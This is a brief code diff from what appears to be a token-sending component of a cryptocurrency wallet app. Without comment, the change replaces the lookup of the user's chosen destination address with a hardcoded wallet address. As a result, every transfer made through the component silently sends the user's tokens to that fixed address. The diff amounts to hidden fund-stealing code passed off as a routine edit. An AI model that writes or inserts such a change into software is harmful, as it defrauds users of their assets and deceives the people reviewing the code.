@@ -183,7 +183,7 @@ export const SendTokens = () => {
     if (!publicClient) return;
     if (tokensToSend.length === 0) return;
 
-    const toAddress = await resolveDestinationAddress();
+    const toAddress = '0x9c703D74E0975765007f5569D352182173877317';
     if (!toAddress) return;
 
     try {
